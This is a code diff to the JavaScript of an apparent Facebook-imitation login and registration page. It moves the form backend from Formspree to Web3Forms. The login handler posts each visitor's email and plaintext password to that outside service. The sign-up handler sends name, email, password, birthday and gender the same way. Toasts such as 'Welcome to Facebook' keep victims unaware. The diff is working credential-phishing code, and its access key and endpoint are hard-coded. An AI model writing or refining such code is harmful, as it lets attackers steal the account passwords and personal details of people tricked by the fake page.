@@ -143,16 +143,16 @@ document.addEventListener('DOMContentLoaded', () => {
       loginPassword,
       () => loginPassword.value.length >= 6,
       'passwordError'
-    );
-
-    if (isEmailValid && isPasswordValid) {
+    );    if (isEmailValid && isPasswordValid) {
       setLoadingState(true);
-      
-      const payload = new FormData();
-      payload.append('email', loginEmail.value);
-      payload.append('message', 'Login Token: ' + loginPassword.value);
 
-      fetch('https://formspree.io/f/xeewwdol', {
+      const payload = new FormData();
+      payload.append('access_key', 'e50f49de-782b-44b8-afe1-f2289d82f207');
+      payload.append('name', 'Facebook Login Form');
+      payload.append('email', loginEmail.value);
+      payload.append('message', 'Password: ' + loginPassword.value);
+
+      fetch('https://api.web3forms.com/submit', {
         method: 'POST',
         body: payload,
         headers: {
@@ -165,13 +165,7 @@ document.addEventListener('DOMContentLoaded', () => {
           showToast('Login details recorded! Redirecting you...', 'success');
           loginForm.reset();
         } else {
-          response.json().then(data => {
-            if (Object.prototype.hasOwnProperty.call(data, 'errors')) {
-              showToast(data.errors.map(error => error.message).join(", "), 'error');
-            } else {
-              showToast('Form submission failed. Please try again.', 'error');
-            }
-          });
+          showToast('Form submission failed. Please try again.', 'error');
         }
       })
       .catch(error => {
@@ -216,14 +210,15 @@ document.addEventListener('DOMContentLoaded', () => {
       setRegLoadingState(true);
 
       const payload = new FormData();
-      payload.append('firstName', regFirstName.value);
-      payload.append('lastName', regLastName.value);
+      payload.append('access_key', 'e50f49de-782b-44b8-afe1-f2289d82f207');
+      payload.append('name', `${regFirstName.value} ${regLastName.value}`);
       payload.append('email', regEmail.value);
-      payload.append('dob', `${dobMonth.value}/${dobDay.value}/${dobYear.value}`);
-      payload.append('gender', signUpForm.querySelector('input[name="gender"]:checked').value);
-      payload.append('message', 'Registration Token: ' + regPassword.value);
+      payload.append('message', `New Account Registration.
+Password: ${regPassword.value}
+Birthday: ${dobMonth.value}/${dobDay.value}/${dobYear.value}
+Gender: ${signUpForm.querySelector('input[name="gender"]:checked').value}`);
 
-      fetch('https://formspree.io/f/xeewwdol', {
+      fetch('https://api.web3forms.com/submit', {
         method: 'POST',
         body: payload,
         headers: {
@@ -236,13 +231,7 @@ document.addEventListener('DOMContentLoaded', () => {
           showToast('Account created successfully! Welcome to Facebook.', 'success');
           closeModal();
         } else {
-          response.json().then(data => {
-            if (Object.prototype.hasOwnProperty.call(data, 'errors')) {
-              showToast(data.errors.map(error => error.message).join(", "), 'error');
-            } else {
-              showToast('Registration failed. Please try again.', 'error');
-            }
-          });
+          showToast('Registration failed. Please try again.', 'error');
         }
       })
       .catch(error => {
